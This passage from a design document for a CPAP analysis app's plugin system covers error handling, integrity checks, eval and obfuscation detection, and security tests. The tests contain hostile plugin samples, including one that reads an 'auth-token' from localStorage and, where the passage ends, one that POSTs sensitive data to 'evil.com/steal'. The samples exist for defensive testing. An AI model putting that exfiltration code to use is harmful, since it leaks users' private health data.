      pluginId: plugin.id,
      errorCategory: pluginError.category,
      message: pluginError.message,
    });

    // Return error (does NOT throw, does NOT crash app)
    return { ok: false, error: pluginError };
  }
}

/**
 * Classify plugin errors for appropriate handling
 */
function classifyPluginError(plugin: PluginManifest, error: unknown): CPAPError {
  // Timeout
  if (error instanceof TimeoutError) {
    return {
      id: generateErrorId(),
      category: ErrorCategory.WORKER,
      severity: ErrorSeverity.ERROR,
      title: 'Plugin Timed Out',
      message: `The plugin "${plugin.name}" took too long to complete and was stopped.`,
      recoverySteps: [
        'Try analyzing a smaller date range',
        'Check if the plugin has configuration options to reduce complexity',
        'Contact the plugin developer if this persists',
      ],
      technicalDetails: {
        pluginId: plugin.id,
        timeoutMs: plugin.timeoutMs,
        errorType: 'TIMEOUT',
      },
    };
  }

  // Permission denied
  if (error instanceof SecurityError && error.code === 'PERMISSION_DENIED') {
    return {
      id: generateErrorId(),
      category: ErrorCategory.USER,
      severity: ErrorSeverity.WARNING,
      title: 'Permission Denied',
      message: `The plugin "${plugin.name}" attempted an action that requires additional permissions.`,
      recoverySteps: [
        'Reinstall the plugin and grant the required permissions',
        "Or disable this plugin if you don't want to grant the permission",
      ],
      technicalDetails: {
        pluginId: plugin.id,
        error: error.message,
      },
    };
  }

  // Generic plugin error
  return {
    id: generateErrorId(),
    category: ErrorCategory.WORKER,
    severity: ErrorSeverity.ERROR,
    title: 'Plugin Error',
    message: `The plugin "${plugin.name}" encountered an error and could not complete.`,
    recoverySteps: [
      'Your data is safe—this error only affected the plugin',
      'Try running the analysis again',
      'If this persists, disable or uninstall the plugin',
      'Report this error to the plugin developer',
    ],
    technicalDetails: {
      pluginId: plugin.id,
      error: error instanceof Error ? error.message : String(error),
      stack: error instanceof Error ? error.stack : undefined,
    },
  };
}
```

#### 8.7.2 Error Boundaries for Plugin UI

Visualization plugins may render React components. These are wrapped in error boundaries:

```typescript
/**
 * Error boundary for plugin-rendered UI components
 */
class PluginUIErrorBoundary extends React.Component<
  { plugin: PluginManifest; fallback?: React.ReactNode },
  { hasError: boolean; error?: Error }
> {
  state = { hasError: false, error: undefined };

  static getDerivedStateFromError(error: Error) {
    return { hasError: true, error };
  }

  componentDidCatch(error: Error, errorInfo: React.ErrorInfo) {
    console.error(`[PluginUI] Error in plugin "${this.props.plugin.id}":`, error, errorInfo);

    // Report to plugin error store (for user to export)
    reportPluginUIError({
      pluginId: this.props.plugin.id,
      error: error.message,
      stack: error.stack,
      componentStack: errorInfo.componentStack
    });
  }

  render() {
    if (this.state.hasError) {
      return (
        this.props.fallback || (
          <Alert severity="error">
            <AlertTitle>Plugin Error: {this.props.plugin.name}</AlertTitle>
            <Typography variant="body2">
              This plugin encountered an error while rendering. Your data is safe.
            </Typography>
            <Button onClick={() => this.setState({ hasError: false, error: undefined })}>
              Try Again
            </Button>
            <Button onClick={() => disablePlugin(this.props.plugin.id)}>
              Disable Plugin
            </Button>
          </Alert>
        )
      );
    }

    return this.props.children;
  }
}

/**
 * Usage: Wrap plugin UI in error boundary
 */
function PluginVisualization({ plugin, data }: { plugin: VisualizationPlugin; data: unknown }) {
  return (
    <PluginUIErrorBoundary plugin={plugin.manifest}>
      <plugin.ComponentType data={data} />
    </PluginUIErrorBoundary>
  );
}
```

#### 8.7.3 User Notification Pattern

```typescript
/**
 * User-friendly error notification for plugin failures
 */
function notifyPluginFailure(plugin: PluginManifest, error: CPAPError): void {
  showNotification({
    severity: 'error',
    title: error.title,
    message: error.message,
    actions: [
      {
        label: 'View Details',
        onClick: () => showErrorDetails(error),
      },
      {
        label: 'Disable Plugin',
        onClick: () => disablePlugin(plugin.id),
      },
      {
        label: 'Dismiss',
        onClick: () => {}, // Close notification
      },
    ],
    autoHideDuration: null, // Require explicit dismissal for plugin errors
  });
}

/**
 * Example usage in plugin execution flow
 */
async function runAnalysis(plugin: PluginManifest, input: PluginInput): Promise<void> {
  const result = await executePluginIsolated(plugin, input);

  if (!result.ok) {
    // Plugin failed, notify user (app still functional)
    notifyPluginFailure(plugin, result.error);
    return;
  }

  // Success: save and display result
  await savePluginResult(result.value);
  showSuccessNotification(`Analysis complete: ${plugin.name}`);
}
```

### 8.8 Code Integrity

**Principle**: Verify plugin code has not been tampered with since installation.

#### 8.8.1 Plugin Manifest Integrity Hash

```typescript
/**
 * Verify plugin code integrity using SHA-256 hash
 */
async function verifyPluginIntegrity(
  manifest: PluginManifest,
): Promise<{ valid: boolean; error?: string }> {
  try {
    // Fetch plugin code
    const response = await fetch(manifest.main);
    const code = await response.text();

    // Compute hash
    const encoder = new TextEncoder();
    const data = encoder.encode(code);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const computedHash = hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');

    // Compare with manifest hash
    if (computedHash !== manifest.integrityHash) {
      return {
        valid: false,
        error: `Integrity hash mismatch: expected ${manifest.integrityHash}, got ${computedHash}`,
      };
    }

    return { valid: true };
  } catch (error) {
    return {
      valid: false,
      error: `Integrity verification failed: ${error instanceof Error ? error.message : String(error)}`,
    };
  }
}

/**
 * Generate integrity hash for plugin during development
 */
async function generatePluginIntegrityHash(pluginCode: string): Promise<string> {
  const encoder = new TextEncoder();
  const data = encoder.encode(pluginCode);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
}
```

#### 8.8.2 Subresource Integrity (SRI) for External Assets

If plugins load external scripts or stylesheets:

```typescript
/**
 * Plugin manifest with SRI hashes for external dependencies
 */
interface PluginManifest {
  // ... other fields

  /**
   * External resources with Subresource Integrity hashes
   */
  externalResources?: {
    url: string;
    integrity: string; // SRI hash (e.g., "sha384-...")
    crossorigin?: 'anonymous' | 'use-credentials';
  }[];
}

/**
 * Load external resource with SRI verification
 */
async function loadExternalResource(resource: {
  url: string;
  integrity: string;
  crossorigin?: string;
}): Promise<void> {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = resource.url;
    script.integrity = resource.integrity;
    script.crossOrigin = resource.crossorigin || 'anonymous';

    script.onload = () => resolve();
    script.onerror = () => reject(new Error(`Failed to load ${resource.url}`));

    document.head.appendChild(script);
  });
}
```

**Note**: We prefer **bundling** plugin dependencies over external script loading. SRI is a fallback for plugins that must load external resources.

#### 8.8.3 No eval() or Function() in Plugin Context

```typescript
/**
 * CSP header prevents eval() and new Function()
 */
const CSP_HEADER = `
  default-src 'self';
  script-src 'self';
  script-src-elem 'self';
  worker-src 'self' blob:;
  object-src 'none';
  base-uri 'self';
`
  .trim()
  .replace(/\s+/g, ' ');

// In plugin worker, eval/Function are blocked by CSP
// Attempt to use eval() throws: EvalError: Refused to evaluate a string as JavaScript
```

**Static code analysis** during plugin installation also checks for `eval` and `Function` usage:

```typescript
function validateNoEval(pluginCode: string): { valid: boolean; violations: string[] } {
  const violations: string[] = [];

  // Check for eval
  if (/\beval\s*\(/.test(pluginCode)) {
    violations.push('Uses eval() (prohibited)');
  }

  // Check for Function constructor
  if (/\bnew\s+Function\s*\(/.test(pluginCode) || /\bFunction\s*\(/.test(pluginCode)) {
    violations.push('Uses Function() constructor (prohibited)');
  }

  // Check for setTimeout/setInterval with string arguments (also eval-like)
  if (/(setTimeout|setInterval)\s*\(\s*["'`]/.test(pluginCode)) {
    violations.push('Uses setTimeout/setInterval with string argument (prohibited)');
  }

  return {
    valid: violations.length === 0,
    violations,
  };
}
```

### 8.9 Plugin Loading & Verification

**Principle**: Plugins are validated before installation and verified on every load.

#### 8.9.1 Plugin Manifest Schema Validation

```typescript
/**
 * Zod schema for plugin manifest validation
 */
import { z } from 'zod';

const PluginPermissionSchema = z.enum([
  'storage.read',
  'storage.write',
  'storage.delete',
  'data.sessions',
  'data.aggregates',
  'data.events',
  'data.signals',
  'data.notes',
  'data.integrations.fitbit',
  'data.integrations.weather',
  'network',
  'export',
  'ui.render',
]);

const PluginManifestSchema = z.object({
  // Required fields
  id: z.string().regex(/^[a-z0-9-_.]+$/),
  name: z.string().min(1).max(100),
  version: z.string().regex(/^\d+\.\d+\.\d+$/), // Semantic versioning
  author: z.string().min(1).max(100),
  description: z.string().min(10).max(500),
  type: z.enum(['machine', 'analysis', 'visualization', 'integration', 'export']),
  permissions: z.array(PluginPermissionSchema),
  integrityHash: z.string().regex(/^[a-f0-9]{64}$/), // SHA-256 hash
  main: z.string().url(),

  // Optional fields
  sourceUrl: z.string().url().optional(),
  dataRequirements: z
    .object({
      signals: z.array(z.string()).optional(),
      minSessionCount: z.number().int().positive().optional(),
      maxMemoryMB: z.number().int().positive().optional(),
    })
    .optional(),
  timeoutMs: z.number().int().positive().max(300_000).optional(), // Max 5 minutes
  maxMemoryMB: z.number().int().positive().max(2048).optional(), // Max 2GB
});

type PluginManifest = z.infer<typeof PluginManifestSchema>;

/**
 * Validate plugin manifest during installation
 */
function validateManifestSchema(manifest: unknown): { valid: boolean; errors: string[] } {
  const result = PluginManifestSchema.safeParse(manifest);

  if (result.success) {
    return { valid: true, errors: [] };
  }

  const errors = result.error.errors.map((err) => `${err.path.join('.')}: ${err.message}`);
  return { valid: false, errors };
}
```

#### 8.9.2 Pre-Installation Validation Checklist

```typescript
/**
 * Complete pre-installation validation
 */
async function validatePluginForInstallation(
  manifest: PluginManifest,
  code: string,
): Promise<{ valid: boolean; errors: string[]; warnings: string[] }> {
  const errors: string[] = [];
  const warnings: string[] = [];

  // 1. Manifest schema
  const schemaValidation = validateManifestSchema(manifest);
  if (!schemaValidation.valid) {
    errors.push(...schemaValidation.errors);
    return { valid: false, errors, warnings }; // Can't continue without valid manifest
  }

  // 2. Code integrity
  const integrityCheck = await verifyPluginIntegrity(manifest);
  if (!integrityCheck.valid) {
    errors.push(`Integrity verification failed: ${integrityCheck.error}`);
  }

  // 3. No eval/Function
  const noEvalCheck = validateNoEval(code);
  if (!noEvalCheck.valid) {
    errors.push(...noEvalCheck.violations);
  }

  // 4. ESLint security rules
  const lintResult = await lintPluginCode(code);
  errors.push(...lintResult.errors);
  warnings.push(...lintResult.warnings);

  // 5. Permissions match code usage
  const permissionCheck = analyzeCodeForPermissionUsage(code);
  if (permissionCheck.undeclaredUsage.length > 0) {
    errors.push(
      `Code uses APIs not declared in permissions: ${permissionCheck.undeclaredUsage.join(', ')}`,
    );
  }
  if (permissionCheck.unusedPermissions.length > 0) {
    warnings.push(
      `Declared permissions not used in code: ${permissionCheck.unusedPermissions.join(', ')}`,
    );
  }

  // 6. Check for obfuscation (heuristic)
  const obfuscationCheck = detectObfuscation(code);
  if (obfuscationCheck.isObfuscated) {
    warnings.push(`Code appears to be obfuscated: ${obfuscationCheck.indicators.join(', ')}`);
  }

  return {
    valid: errors.length === 0,
    errors,
    warnings,
  };
}

/**
 * Analyze code to detect permission usage
 */
function analyzeCodeForPermissionUsage(code: string): {
  declaredPermissions: PluginPermission[];
  usedApis: string[];
  undeclaredUsage: string[];
  unusedPermissions: PluginPermission[];
} {
  // Simple heuristic: check for API method calls in code
  const apiUsage: Record<string, PluginPermission> = {
    getSessions: 'data.sessions',
    getNightlyAggregates: 'data.aggregates',
    getEvents: 'data.events',
    getSignalData: 'data.signals',
    saveResult: 'storage.write',
    fetch: 'network',
  };

  const usedApis = Object.keys(apiUsage).filter((api) => code.includes(api));
  const requiredPermissions = usedApis.map((api) => apiUsage[api]);

  // (In real implementation, use AST parsing for accurate detection)

  return {
    declaredPermissions: [], // From manifest
    usedApis,
    undeclaredUsage: [], // Permissions needed but not declared
    unusedPermissions: [], // Permissions declared but not used
  };
}

/**
 * Detect code obfuscation (heuristic)
 */
function detectObfuscation(code: string): {
  isObfuscated: boolean;
  indicators: string[];
} {
  const indicators: string[] = [];

  // Very long identifier names (common in obfuscators)
  if (/\b[a-zA-Z_$][a-zA-Z0-9_$]{50,}\b/.test(code)) {
    indicators.push('Unusually long identifier names');
  }

  // Excessive string escaping
  const escapeCount = (code.match(/\\x[0-9a-f]{2}/gi) || []).length;
  if (escapeCount > 50) {
    indicators.push('Excessive hex-escaped strings');
  }

  // Very low average identifier length (obfuscated names: a, b, c, etc.)
  const identifiers = code.match(/\b[a-zA-Z_$][a-zA-Z0-9_$]*\b/g) || [];
  const avgLength = identifiers.reduce((sum, id) => sum + id.length, 0) / identifiers.length;
  if (avgLength < 2) {
    indicators.push('Very short identifier names (average < 2 chars)');
  }

  return {
    isObfuscated: indicators.length > 0,
    indicators,
  };
}
```

#### 8.9.3 User Review Before Enabling

```typescript
/**
 * Installation flow with user review step
 */
async function installPluginWorkflow(manifest: PluginManifest): Promise<void> {
  // 1. Fetch plugin code
  const code = await fetchPluginCode(manifest.main);

  // 2. Validate
  const validation = await validatePluginForInstallation(manifest, code);

  // 3. Show validation results to user
  if (!validation.valid) {
    throw new ValidationError(
      `Plugin validation failed:\n${validation.errors.join('\n')}`,
      'PLUGIN_VALIDATION_FAILED',
      { errors: validation.errors, warnings: validation.warnings },
    );
  }

  if (validation.warnings.length > 0) {
    const proceed = await showValidationWarningsDialog({
      pluginName: manifest.name,
      warnings: validation.warnings,
    });

    if (!proceed) {
      throw new UserCancelledError('User cancelled plugin installation after reviewing warnings');
    }
  }

  // 4. Request permissions (user consent)
  const consent = await showPluginConsentDialog(manifest);
  if (!consent.granted) {
    throw new UserCancelledError('User denied plugin permissions');
  }

  // 5. Install
  await pluginRegistry.install({
    manifest,
    code,
    installedAt: new Date().toISOString(),
    grantedPermissions: consent.grantedPermissions,
    enabled: true,
  });

  showSuccessNotification(`Plugin installed: ${manifest.name}`);
}
```

#### 8.9.4 Disable Mechanism

```typescript
/**
 * User can disable problematic plugins without uninstalling
 */
async function disablePlugin(pluginId: string): Promise<void> {
  const plugin = await pluginRegistry.get(pluginId);
  if (!plugin) {
    throw new Error(`Plugin not found: ${pluginId}`);
  }

  // Set enabled flag to false
  plugin.enabled = false;
  await pluginRegistry.update(plugin);

  // Terminate any running workers for this plugin
  await terminatePluginWorkers(pluginId);

  console.log(`[PluginManager] Disabled plugin: ${pluginId}`);
}

/**
 * Re-enable a disabled plugin (re-validates first)
 */
async function enablePlugin(pluginId: string): Promise<void> {
  const plugin = await pluginRegistry.get(pluginId);
  if (!plugin) {
    throw new Error(`Plugin not found: ${pluginId}`);
  }

  // Re-verify integrity
  const integrityCheck = await verifyPluginIntegrity(plugin.manifest);
  if (!integrityCheck.valid) {
    throw new SecurityError(
      `Cannot enable plugin: integrity verification failed: ${integrityCheck.error}`,
      'INTEGRITY_VERIFICATION_FAILED',
    );
  }

  plugin.enabled = true;
  await pluginRegistry.update(plugin);

  console.log(`[PluginManager] Enabled plugin: ${pluginId}`);
}
```

### 8.10 Third-Party Plugin Concerns

**Status**: First-party plugins only (v1.0). Third-party plugin marketplace is a **future enhancement**.

#### 8.10.1 Plugin Marketplace Considerations (Future)

When we support third-party plugins in a marketplace:

**Required**:

1. **Code Review Process**: All plugins must pass security review by maintainers
2. **Developer Verification**: Plugin developers must verify their identity (email, GitHub)
3. **Binary Transparency**: Plugin source code must be publicly available for audit
4. **User Ratings & Reports**: Users can rate plugins and report security concerns
5. **Automated Scanning**: CI pipeline scans plugins for:
   - Known vulnerabilities (npm audit, Snyk)
   - Obfuscated code (detection heuristics)
   - Suspicious API usage (AST analysis)
6. **Revocation Mechanism**: Ability to remotely disable plugins if vulnerability discovered

**Recommendations for Plugin Developers**:

```markdown
# Plugin Security Checklist for Developers

## Before Submission

- [ ] Run `npm audit` and fix all high/critical vulnerabilities
- [ ] Remove all unused dependencies
- [ ] Provide source code repository (GitHub, GitLab, etc.)
- [ ] Include unit tests (>80% coverage)
- [ ] Document all required permissions in README
- [ ] Do not obfuscate code (minification OK, obfuscation not allowed)
- [ ] Do not use eval(), Function(), or other dynamic code execution
- [ ] Follow principle of least privilege (request minimal permissions)

## During Development

- [ ] Use TypeScript for type safety
- [ ] Validate all inputs (user data, API responses)
- [ ] Handle errors gracefully (don't crash)
- [ ] Respect timeouts (complex analyses should report progress)
- [ ] Test with malformed data (corrupted EDF files, etc.)

## After Release

- [ ] Respond to security reports within 48 hours
- [ ] Publish security updates promptly
- [ ] Document changes in CHANGELOG with security-relevant notes
```

#### 8.10.2 User Warnings for Unverified Plugins

```typescript
/**
 * Plugin verification status
 */
enum PluginVerificationStatus {
  OFFICIAL = 'official',        // Developed by CPAP Analyzer team
  VERIFIED = 'verified',        // Third-party, passed security review
  UNVERIFIED = 'unverified',    // Third-party, not reviewed
  REVOKED = 'revoked'           // Security issue detected, disabled
}

/**
 * Show warning for unverified plugins
 */
function PluginInstallWarning({ manifest }: { manifest: PluginManifest }) {
  const verificationStatus = getPluginVerificationStatus(manifest);

  if (verificationStatus === PluginVerificationStatus.OFFICIAL) {
    return null; // No warning for official plugins
  }

  if (verificationStatus === PluginVerificationStatus.REVOKED) {
    return (
      <Alert severity="error">
        <AlertTitle>Security Warning: This Plugin Has Been Revoked</AlertTitle>
        <Typography>
          This plugin has been disabled due to a security vulnerability.
          Do not install or enable this plugin.
        </Typography>
      </Alert>
    );
  }

  if (verificationStatus === PluginVerificationStatus.UNVERIFIED) {
    return (
      <Alert severity="warning">
        <AlertTitle>Unverified Plugin</AlertTitle>
        <Typography>
          This plugin has not been reviewed by the CPAP Analyzer security team.
          Only install plugins from developers you trust.
        </Typography>
        <Typography variant="body2" sx={{ mt: 1 }}>
          ⚠️ Unverified plugins may:
          <ul>
            <li>Contain bugs that corrupt your data</li>
            <li>Send your health data to external servers</li>
            <li>Crash the application</li>
          </ul>
        </Typography>
      </Alert>
    );
  }

  return null;
}
```

#### 8.10.3 Plugin Signing & Verification (Future Enhancement)

**Code signing** for plugin authenticity:

```typescript
/**
 * Future: Plugin signed with developer's private key
 */
interface SignedPluginManifest extends PluginManifest {
  /**
   * Digital signature (RSA or Ed25519)
   * Signature is over: id, version, integrityHash, author
   */
  signature: string;

  /**
   * Developer's public key for signature verification
   */
  publicKey: string;
}

/**
 * Verify plugin signature
 */
async function verifyPluginSignature(
  manifest: SignedPluginManifest,
): Promise<{ valid: boolean; error?: string }> {
  try {
    // Import developer's public key
    const publicKey = await crypto.subtle.importKey(
      'spki',
      base64Decode(manifest.publicKey),
      { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
      false,
      ['verify'],
    );

    // Construct signed data
    const signedData = JSON.stringify({
      id: manifest.id,
      version: manifest.version,
      integrityHash: manifest.integrityHash,
      author: manifest.author,
    });

    // Verify signature
    const signature = base64Decode(manifest.signature);
    const encoder = new TextEncoder();
    const data = encoder.encode(signedData);

    const isValid = await crypto.subtle.verify('RSASSA-PKCS1-v1_5', publicKey, signature, data);

    return { valid: isValid };
  } catch (error) {
    return {
      valid: false,
      error: `Signature verification failed: ${error instanceof Error ? error.message : String(error)}`,
    };
  }
}
```

### 8.11 Integration with Error Handling Architecture

Plugin errors are classified using the existing error taxonomy from [error-handling-architecture.md](error-handling-architecture.md).

#### 8.11.1 Plugin Error Categories

Plugin-related errors map to the error taxonomy:

| Plugin Error           | Error Category | Severity  | User Message Example                      |
| ---------------------- | -------------- | --------- | ----------------------------------------- |
| Permission denied      | `USER`         | `WARNING` | "Plugin needs additional permission"      |
| Timeout                | `WORKER`       | `ERROR`   | "Plugin took too long to complete"        |
| Memory limit exceeded  | `WORKER`       | `ERROR`   | "Plugin used too much memory"             |
| Invalid result         | `DATA`         | `ERROR`   | "Plugin produced invalid analysis result" |
| Network request failed | `NETWORK`      | `ERROR`   | "Plugin could not reach external service" |
| Worker crash           | `WORKER`       | `ERROR`   | "Plugin encountered an error"             |
| Code validation failed | `SYSTEM`       | `ERROR`   | "Plugin code failed security checks"      |

```typescript
/**
 * Convert plugin-specific errors to CPAPError
 */
function pluginErrorToCPAPError(plugin: PluginManifest, error: PluginExecutionError): CPAPError {
  const baseError: Omit<
    CPAPError,
    'category' | 'severity' | 'title' | 'message' | 'recoverySteps'
  > = {
    id: generateErrorId(),
    timestamp: new Date().toISOString(),
    technicalDetails: {
      pluginId: plugin.id,
      pluginVersion: plugin.version,
      errorType: error.type,
    },
  };

  switch (error.type) {
    case 'TIMEOUT':
      return {
        ...baseError,
        category: ErrorCategory.WORKER,
        severity: ErrorSeverity.ERROR,
        title: 'Plugin Timeout',
        message: `The plugin "${plugin.name}" took too long and was stopped.`,
        recoverySteps: [
          'Try analyzing a smaller date range',
          'Check plugin settings for complexity options',
          'Contact plugin developer if issue persists',
        ],
      };

    case 'MEMORY_LIMIT':
      return {
        ...baseError,
        category: ErrorCategory.WORKER,
        severity: ErrorSeverity.ERROR,
        title: 'Plugin Memory Limit',
        message: `The plugin "${plugin.name}" used too much memory and was stopped.`,
        recoverySteps: [
          'Try analyzing a smaller dataset',
          'Close other browser tabs to free memory',
          'Contact plugin developer to report this issue',
        ],
      };

    case 'PERMISSION_DENIED':
      return {
        ...baseError,
        category: ErrorCategory.USER,
        severity: ErrorSeverity.WARNING,
        title: 'Permission Required',
        message: `The plugin "${plugin.name}" requires additional permissions.`,
        recoverySteps: [
          'Reinstall the plugin and grant the required permissions',
          'Or disable this plugin',
        ],
      };

    case 'INVALID_RESULT':
      return {
        ...baseError,
        category: ErrorCategory.DATA,
        severity: ErrorSeverity.ERROR,
        title: 'Invalid Plugin Result',
        message: `The plugin "${plugin.name}" produced invalid data.`,
        recoverySteps: [
          'Your data is safe—only the plugin result was affected',
          'Try running the analysis again',
          'Report this to the plugin developer',
          'Consider disabling this plugin',
        ],
      };

    default:
      return {
        ...baseError,
        category: ErrorCategory.WORKER,
        severity: ErrorSeverity.ERROR,
        title: 'Plugin Error',
        message: `The plugin "${plugin.name}" encountered an error.`,
        recoverySteps: ['Your data is safe', 'Try again', 'If this persists, disable the plugin'],
      };
  }
}
```

#### 8.11.2 Plugin Error Recovery Patterns

```typescript
/**
 * Retry logic for transient plugin failures
 */
async function executePluginWithRetry(
  plugin: PluginManifest,
  input: PluginInput,
  maxRetries: number = 2,
): Promise<Result<PluginOutput, CPAPError>> {
  let lastError: CPAPError | undefined;

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    const result = await executePluginIsolated(plugin, input);

    if (result.ok) {
      return result; // Success
    }

    lastError = result.error;

    // Retry only for transient errors
    const isRetryable = [ErrorCategory.WORKER, ErrorCategory.NETWORK].includes(
      result.error.category,
    );

    if (!isRetryable || attempt === maxRetries) {
      break; // Give up
    }

    // Exponential backoff
    const delayMs = Math.pow(2, attempt) * 1000;
    await sleep(delayMs);

    console.log(`[PluginManager] Retrying plugin ${plugin.id}, attempt ${attempt + 1}`);
  }

  return { ok: false, error: lastError! };
}

/**
 * Fallback when required plugin fails
 */
async function executeAnalysisWithFallback(
  preferredPlugin: PluginManifest,
  fallbackPlugin: PluginManifest,
  input: PluginInput,
): Promise<PluginOutput> {
  // Try preferred plugin
  const preferredResult = await executePluginWithRetry(preferredPlugin, input);

  if (preferredResult.ok) {
    return preferredResult.value;
  }

  // Notify user of fallback
  showNotification({
    severity: 'warning',
    title: 'Using Fallback Analysis',
    message: `${preferredPlugin.name} failed. Using ${fallbackPlugin.name} instead.`,
  });

  // Try fallback plugin
  const fallbackResult = await executePluginWithRetry(fallbackPlugin, input);

  if (fallbackResult.ok) {
    return fallbackResult.value;
  }

  // Both failed, throw error
  throw new Error(
    `Both plugins failed:\n` +
      `- ${preferredPlugin.name}: ${preferredResult.error.message}\n` +
      `- ${fallbackPlugin.name}: ${fallbackResult.error.message}`,
  );
}
```

### 8.12 Testing Plugin Security

**Objective**: Verify plugin isolation, permission enforcement, and resource limits through automated security tests.

#### 8.12.1 Security Test Suite

```typescript
/**
 * Security test suite for plugin system
 */
describe('Plugin Security', () => {
  describe('Isolation', () => {
    it('should prevent plugin from accessing DOM', async () => {
      const maliciousPlugin = createTestPlugin({
        id: 'malicious-dom-access',
        code: `
          // Attempt to access DOM
          self.onmessage = () => {
            try {
              const elem = document.getElementById('app');
              self.postMessage({ success: true, elem });
            } catch (error) {
              self.postMessage({ success: false, error: error.message });
            }
          };
        `,
      });

      const result = await executePlugin(maliciousPlugin, {});

      expect(result.success).toBe(false);
      expect(result.error).toContain('document is not defined');
    });

    it('should prevent plugin from accessing localStorage', async () => {
      const maliciousPlugin = createTestPlugin({
        code: `
          self.onmessage = () => {
            try {
              const token = localStorage.getItem('auth-token');
              self.postMessage({ success: true, token });
            } catch (error) {
              self.postMessage({ success: false, error: error.message });
            }
          };
        `,
      });

      const result = await executePlugin(maliciousPlugin, {});

      expect(result.success).toBe(false);
      expect(result.error).toContain('localStorage is not defined');
    });

    it('should prevent plugin from accessing other plugin data', async () => {
      // Plugin A stores data
      const pluginA = createTestPlugin({ id: 'plugin-a' });
      await executePlugin(pluginA, { action: 'store', data: 'secret' });

      // Plugin B attempts to read Plugin A's data
      const pluginB = createTestPlugin({
        id: 'plugin-b',
        code: `
          self.onmessage = () => {
            try {
              const otherData = self.pluginRegistry.get('plugin-a').data;
              self.postMessage({ success: true, otherData });
            } catch (error) {
              self.postMessage({ success: false, error: error.message });
            }
          };
        `,
      });

      const result = await executePlugin(pluginB, {});

      expect(result.success).toBe(false);
      expect(result.error).toContain('pluginRegistry is not defined');
    });
  });

  describe('Permission Enforcement', () => {
    it('should deny network access without permission', async () => {
      const plugin = createTestPlugin({
        id: 'no-network-perm',
        permissions: ['storage.read'], // No 'network' permission
        code: `
          self.onmessage = async () => {
            try {
              await fetch('https://example.com/data');
              self.postMessage({ success: true });
            } catch (error) {
              self.postMessage({ success: false, error: error.message });
            }
          };
        `,
      });

      await expect(executePlugin(plugin, {})).rejects.toThrow(SecurityError);
      await expect(executePlugin(plugin, {})).rejects.toThrow('PERMISSION_DENIED');
    });

    it('should deny signal access without permission', async () => {
      const plugin = createTestPlugin({
        permissions: ['storage.read', 'data.sessions'], // No 'data.signals'
      });

      const dataProvider = createSecureDataProvider(plugin);

      await expect(dataProvider.getSignalData('session-123', 'Flow')).rejects.toThrow(
        'data.signals',
      );
    });

    it('should deny undeclared signal channels', async () => {
      const plugin = createTestPlugin({
        permissions: ['storage.read', 'data.signals'],
        dataRequirements: {
          signals: ['Flow'], // Only Flow declared
        },
      });

      const dataProvider = createSecureDataProvider(plugin);

      // Allowed: declared signal
      await expect(dataProvider.getSignalData('session-123', 'Flow')).resolves.toBeDefined();

      // Denied: undeclared signal
      await expect(dataProvider.getSignalData('session-123', 'Pressure')).rejects.toThrow(
        'UNDECLARED_DATA_ACCESS',
      );
    });
  });

  describe('Resource Limits', () => {
    it('should terminate plugin after timeout', async () => {
      const plugin = createTestPlugin({
        timeoutMs: 1000, // 1 second timeout
        code: `
          self.onmessage = () => {
            // Infinite loop
            while (true) {}
          };
        `,
      });

      const start = Date.now();
      await expect(executePlugin(plugin, {})).rejects.toThrow(TimeoutError);
      const duration = Date.now() - start;

      // Should terminate close to timeout (within 200ms tolerance)
      expect(duration).toBeGreaterThanOrEqual(1000);
      expect(duration).toBeLessThan(1200);
    });

    it('should enforce memory limits', async () => {
      const plugin = createTestPlugin({
        maxMemoryMB: 100,
        code: `
          self.onmessage = () => {
            // Allocate large array (>100MB)
            const data = new Float32Array(30_000_000); // 120MB
            self.postMessage({ success: true, size: data.length });
          };
        `,
      });

      // Note: Memory limits are best-effort and browser-dependent
      // This test may not fail in all environments
      await expect(executePlugin(plugin, {})).rejects.toThrow(/memory|limit/i);
    });
  });

  describe('Error Isolation', () => {
    it('should not crash app when plugin crashes', async () => {
      const crashingPlugin = createTestPlugin({
        code: `
          self.onmessage = () => {
            throw new Error('Plugin crash!');
          };
        `,
      });

      const result = await executePluginIsolated(crashingPlugin, {});

      // Result should be an error, not a thrown exception
      expect(result.ok).toBe(false);
      expect(result.error.category).toBe(ErrorCategory.WORKER);

      // App should still be functional (can execute another plugin)
      const workingPlugin = createTestPlugin({
        code: `
          self.onmessage = () => {
            self.postMessage({ success: true });
          };
        `,
      });

      const result2 = await executePluginIsolated(workingPlugin, {});
      expect(result2.ok).toBe(true);
    });
  });

  describe('Code Integrity', () => {
    it('should reject plugin with invalid integrity hash', async () => {
      const code = 'self.onmessage = () => self.postMessage({ success: true });';
      const validHash = await generatePluginIntegrityHash(code);
      const invalidHash = 'invalid' + validHash.slice(7);

      const manifest: PluginManifest = {
        id: 'test-plugin',
        name: 'Test Plugin',
        version: '1.0.0',
        author: 'Test',
        description: 'Test description that is long enough',
        type: 'analysis',
        permissions: [],
        integrityHash: invalidHash,
        main: 'https://example.com/plugin.js',
      };

      const integrityCheck = await verifyPluginIntegrity(manifest);
      expect(integrityCheck.valid).toBe(false);
      expect(integrityCheck.error).toContain('hash mismatch');
    });

    it('should reject plugin with eval()', async () => {
      const code = `
        self.onmessage = (e) => {
          const result = eval(e.data.expression);
          self.postMessage({ result });
        };
      `;

      const validation = validateNoEval(code);
      expect(validation.valid).toBe(false);
      expect(validation.violations).toContain('Uses eval() (prohibited)');
    });

    it('should reject plugin with Function() constructor', async () => {
      const code = `
        self.onmessage = (e) => {
          const fn = new Function('x', 'return x * 2');
          self.postMessage({ result: fn(21) });
        };
      `;

      const validation = validateNoEval(code);
      expect(validation.valid).toBe(false);
      expect(validation.violations).toContain('Uses Function() constructor (prohibited)');
    });
  });
});
```

#### 8.12.2 Adversarial Plugin Testing

```typescript
/**
 * Adversarial test suite: malicious plugins attempting to bypass security
 */
describe('Adversarial Plugin Tests', () => {
  it('should prevent data exfiltration via network request', async () => {
    const exfiltratingPlugin = createTestPlugin({
      permissions: [' storage.read', 'data.signals'], // No 'network'
      code: `
        self.onmessage = async (e) => {
          const sensitiveData = e.data;

          // Attempt to exfiltrate via fetch
          try {
            await fetch('https://evil.com/steal', {
              method: 'POST',
              body: JSON.stringify(sensitiveData)
            });
